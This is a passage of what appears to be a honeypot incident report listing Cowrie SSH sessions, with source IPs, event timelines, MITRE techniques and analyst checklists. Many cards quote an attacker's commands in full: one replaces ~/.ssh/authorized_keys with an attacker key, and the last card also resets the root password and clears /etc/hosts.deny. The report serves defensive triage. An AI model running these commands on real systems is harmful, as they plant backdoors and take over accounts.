**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-622f7d65bea2

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]57` |
| **First Seen** | 2026-04-12 19:44 |
| **Last Seen** | 2026-04-12 19:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 19:44:11` | `cowrie.session.connect` |
| `2026-04-12 19:44:11` | `cowrie.client.version` |
| `2026-04-12 19:44:11` | `cowrie.client.kex` |
| `2026-04-12 19:44:12` | `cowrie.login.success` |
| `2026-04-12 19:44:12` | `cowrie.session.params` |
| `2026-04-12 19:44:12` | `cowrie.command.input` |
| `2026-04-12 19:44:12` | `cowrie.command.failed` |
| `2026-04-12 19:44:12` | `cowrie.log.closed` |
| `2026-04-12 19:44:13` | `cowrie.session.params` |
| `2026-04-12 19:44:13` | `cowrie.command.input` |
| `2026-04-12 19:44:13` | `cowrie.session.file_download` |
| `2026-04-12 19:44:13` | `cowrie.log.closed` |
| `2026-04-12 19:44:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]57` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb33c3b81f75

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]57` |
| **First Seen** | 2026-04-12 19:44 |
| **Last Seen** | 2026-04-12 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 19:44:15` | `cowrie.session.connect` |
| `2026-04-12 19:44:15` | `cowrie.client.version` |
| `2026-04-12 19:44:15` | `cowrie.client.kex` |
| `2026-04-12 19:44:16` | `cowrie.login.success` |
| `2026-04-12 19:44:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]57` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bde90144c6ca

| Field | Detail |
|---|---|
| **Source IP** | `152.32.130[.]144` |
| **First Seen** | 2026-04-12 19:47 |
| **Last Seen** | 2026-04-12 19:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 19:47:10` | `cowrie.session.connect` |
| `2026-04-12 19:47:10` | `cowrie.client.version` |
| `2026-04-12 19:47:10` | `cowrie.client.kex` |
| `2026-04-12 19:47:10` | `cowrie.login.success` |
| `2026-04-12 19:47:11` | `cowrie.session.params` |
| `2026-04-12 19:47:11` | `cowrie.command.input` |
| `2026-04-12 19:47:11` | `cowrie.command.failed` |
| `2026-04-12 19:47:11` | `cowrie.log.closed` |
| `2026-04-12 19:47:11` | `cowrie.session.params` |
| `2026-04-12 19:47:11` | `cowrie.command.input` |
| `2026-04-12 19:47:11` | `cowrie.session.file_download` |
| `2026-04-12 19:47:11` | `cowrie.log.closed` |
| `2026-04-12 19:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.130[.]144` to AbuseIPDB if not already reported
- [ ] Block `152.32.130[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be5b571878c5

| Field | Detail |
|---|---|
| **Source IP** | `152.32.130[.]144` |
| **First Seen** | 2026-04-12 19:47 |
| **Last Seen** | 2026-04-12 19:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 19:47:13` | `cowrie.session.connect` |
| `2026-04-12 19:47:13` | `cowrie.client.version` |
| `2026-04-12 19:47:13` | `cowrie.client.kex` |
| `2026-04-12 19:47:14` | `cowrie.login.success` |
| `2026-04-12 19:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.130[.]144` to AbuseIPDB if not already reported
- [ ] Block `152.32.130[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7af0b1134a4c

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 19:56 |
| **Last Seen** | 2026-04-12 19:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 19:56:03` | `cowrie.session.connect` |
| `2026-04-12 19:56:03` | `cowrie.client.version` |
| `2026-04-12 19:56:03` | `cowrie.client.kex` |
| `2026-04-12 19:56:04` | `cowrie.login.success` |
| `2026-04-12 19:56:04` | `cowrie.session.params` |
| `2026-04-12 19:56:04` | `cowrie.command.input` |
| `2026-04-12 19:56:04` | `cowrie.command.failed` |
| `2026-04-12 19:56:04` | `cowrie.log.closed` |
| `2026-04-12 19:56:04` | `cowrie.session.params` |
| `2026-04-12 19:56:04` | `cowrie.command.input` |
| `2026-04-12 19:56:04` | `cowrie.session.file_download` |
| `2026-04-12 19:56:04` | `cowrie.log.closed` |
| `2026-04-12 19:56:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eacd36fd4dd6

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 19:56 |
| **Last Seen** | 2026-04-12 19:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 19:56:06` | `cowrie.session.connect` |
| `2026-04-12 19:56:06` | `cowrie.client.version` |
| `2026-04-12 19:56:06` | `cowrie.client.kex` |
| `2026-04-12 19:56:07` | `cowrie.login.success` |
| `2026-04-12 19:56:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75e59ad98f71

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 19:59 |
| **Last Seen** | 2026-04-12 19:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 19:59:14` | `cowrie.session.connect` |
| `2026-04-12 19:59:14` | `cowrie.client.version` |
| `2026-04-12 19:59:14` | `cowrie.client.kex` |
| `2026-04-12 19:59:14` | `cowrie.login.success` |
| `2026-04-12 19:59:15` | `cowrie.session.params` |
| `2026-04-12 19:59:15` | `cowrie.command.input` |
| `2026-04-12 19:59:15` | `cowrie.command.failed` |
| `2026-04-12 19:59:15` | `cowrie.log.closed` |
| `2026-04-12 19:59:15` | `cowrie.session.params` |
| `2026-04-12 19:59:15` | `cowrie.command.input` |
| `2026-04-12 19:59:15` | `cowrie.session.file_download` |
| `2026-04-12 19:59:15` | `cowrie.log.closed` |
| `2026-04-12 19:59:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5851aa288abe

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 19:59 |
| **Last Seen** | 2026-04-12 19:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 19:59:17` | `cowrie.session.connect` |
| `2026-04-12 19:59:17` | `cowrie.client.version` |
| `2026-04-12 19:59:17` | `cowrie.client.kex` |
| `2026-04-12 19:59:17` | `cowrie.login.success` |
| `2026-04-12 19:59:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec2219b4fd4b

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:00 |
| **Last Seen** | 2026-04-12 20:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:00:48` | `cowrie.session.connect` |
| `2026-04-12 20:00:48` | `cowrie.client.version` |
| `2026-04-12 20:00:48` | `cowrie.client.kex` |
| `2026-04-12 20:00:49` | `cowrie.login.success` |
| `2026-04-12 20:00:49` | `cowrie.session.params` |
| `2026-04-12 20:00:49` | `cowrie.command.input` |
| `2026-04-12 20:00:49` | `cowrie.command.failed` |
| `2026-04-12 20:00:49` | `cowrie.log.closed` |
| `2026-04-12 20:00:49` | `cowrie.session.params` |
| `2026-04-12 20:00:49` | `cowrie.command.input` |
| `2026-04-12 20:00:49` | `cowrie.session.file_download` |
| `2026-04-12 20:00:49` | `cowrie.log.closed` |
| `2026-04-12 20:00:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33d0d6052452

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:00 |
| **Last Seen** | 2026-04-12 20:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:00:51` | `cowrie.session.connect` |
| `2026-04-12 20:00:51` | `cowrie.client.version` |
| `2026-04-12 20:00:51` | `cowrie.client.kex` |
| `2026-04-12 20:00:52` | `cowrie.login.success` |
| `2026-04-12 20:00:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ac3e9a353d1

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:04 |
| **Last Seen** | 2026-04-12 20:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:04:09` | `cowrie.session.connect` |
| `2026-04-12 20:04:09` | `cowrie.client.version` |
| `2026-04-12 20:04:09` | `cowrie.client.kex` |
| `2026-04-12 20:04:10` | `cowrie.login.success` |
| `2026-04-12 20:04:10` | `cowrie.session.params` |
| `2026-04-12 20:04:10` | `cowrie.command.input` |
| `2026-04-12 20:04:10` | `cowrie.command.failed` |
| `2026-04-12 20:04:10` | `cowrie.log.closed` |
| `2026-04-12 20:04:10` | `cowrie.session.params` |
| `2026-04-12 20:04:10` | `cowrie.command.input` |
| `2026-04-12 20:04:10` | `cowrie.session.file_download` |
| `2026-04-12 20:04:10` | `cowrie.log.closed` |
| `2026-04-12 20:04:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfe5d4c7b4ee

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:04 |
| **Last Seen** | 2026-04-12 20:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:04:12` | `cowrie.session.connect` |
| `2026-04-12 20:04:12` | `cowrie.client.version` |
| `2026-04-12 20:04:12` | `cowrie.client.kex` |
| `2026-04-12 20:04:13` | `cowrie.login.success` |
| `2026-04-12 20:04:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a913a3bb81ff

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:05 |
| **Last Seen** | 2026-04-12 20:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:05:50` | `cowrie.session.connect` |
| `2026-04-12 20:05:50` | `cowrie.client.version` |
| `2026-04-12 20:05:50` | `cowrie.client.kex` |
| `2026-04-12 20:05:51` | `cowrie.login.success` |
| `2026-04-12 20:05:51` | `cowrie.session.params` |
| `2026-04-12 20:05:51` | `cowrie.command.input` |
| `2026-04-12 20:05:51` | `cowrie.command.failed` |
| `2026-04-12 20:05:51` | `cowrie.log.closed` |
| `2026-04-12 20:05:51` | `cowrie.session.params` |
| `2026-04-12 20:05:51` | `cowrie.command.input` |
| `2026-04-12 20:05:51` | `cowrie.session.file_download` |
| `2026-04-12 20:05:51` | `cowrie.log.closed` |
| `2026-04-12 20:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b23be33e6a04

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:05 |
| **Last Seen** | 2026-04-12 20:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:05:53` | `cowrie.session.connect` |
| `2026-04-12 20:05:53` | `cowrie.client.version` |
| `2026-04-12 20:05:53` | `cowrie.client.kex` |
| `2026-04-12 20:05:54` | `cowrie.login.success` |
| `2026-04-12 20:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3730cbd7b42

| Field | Detail |
|---|---|
| **Source IP** | `14.103.115[.]124` |
| **First Seen** | 2026-04-12 20:10 |
| **Last Seen** | 2026-04-12 20:10 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:q8KwXuNvoff6"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:10:12` | `cowrie.session.connect` |
| `2026-04-12 20:10:12` | `cowrie.client.version` |
| `2026-04-12 20:10:12` | `cowrie.client.kex` |
| `2026-04-12 20:10:12` | `cowrie.login.success` |
| `2026-04-12 20:10:13` | `cowrie.session.params` |
| `2026-04-12 20:10:13` | `cowrie.command.input` |
| `2026-04-12 20:10:13` | `cowrie.command.failed` |
| `2026-04-12 20:10:13` | `cowrie.log.closed` |
| `2026-04-12 20:10:13` | `cowrie.session.params` |
| `2026-04-12 20:10:13` | `cowrie.command.input` |
| `2026-04-12 20:10:13` | `cowrie.session.file_download` |
| `2026-04-12 20:10:13` | `cowrie.log.closed` |
| `2026-04-12 20:10:23` | `cowrie.session.params` |
| `2026-04-12 20:10:23` | `cowrie.command.input` |
| `2026-04-12 20:10:23` | `cowrie.log.closed` |
| `2026-04-12 20:10:24` | `cowrie.session.params` |
| `2026-04-12 20:10:24` | `cowrie.command.input` |
| `2026-04-12 20:10:24` | `cowrie.log.closed` |
| `2026-04-12 20:10:24` | `cowrie.session.params` |
| `2026-04-12 20:10:24` | `cowrie.command.input` |
| `2026-04-12 20:10:25` | `cowrie.session.file_download` |
| `2026-04-12 20:10:25` | `cowrie.log.closed` |
| `2026-04-12 20:10:25` | `cowrie.session.params` |
| `2026-04-12 20:10:25` | `cowrie.command.input` |
| `2026-04-12 20:10:25` | `cowrie.log.closed` |
| `2026-04-12 20:10:26` | `cowrie.session.params` |
| `2026-04-12 20:10:26` | `cowrie.command.input` |
| `2026-04-12 20:10:26` | `cowrie.log.closed` |
| `2026-04-12 20:10:26` | `cowrie.session.params` |
| `2026-04-12 20:10:26` | `cowrie.command.input` |
| `2026-04-12 20:10:26` | `cowrie.command.input` |
| `2026-04-12 20:10:27` | `cowrie.log.closed` |
| `2026-04-12 20:10:27` | `cowrie.session.params` |
| `2026-04-12 20:10:27` | `cowrie.command.input` |
| `2026-04-12 20:10:27` | `cowrie.log.closed` |
| `2026-04-12 20:10:27` | `cowrie.session.params` |
| `2026-04-12 20:10:27` | `cowrie.command.input` |
| `2026-04-12 20:10:27` | `cowrie.log.closed` |
| `2026-04-12 20:10:28` | `cowrie.session.params` |
| `2026-04-12 20:10:28` | `cowrie.command.input` |
| `2026-04-12 20:10:28` | `cowrie.log.closed` |
| `2026-04-12 20:10:29` | `cowrie.session.params` |
| `2026-04-12 20:10:29` | `cowrie.command.input` |
| `2026-04-12 20:10:29` | `cowrie.log.closed` |
| `2026-04-12 20:10:29` | `cowrie.session.params` |
| `2026-04-12 20:10:29` | `cowrie.command.input` |
| `2026-04-12 20:10:29` | `cowrie.log.closed` |
| `2026-04-12 20:10:30` | `cowrie.session.params` |
| `2026-04-12 20:10:30` | `cowrie.command.input` |
| `2026-04-12 20:10:30` | `cowrie.log.closed` |
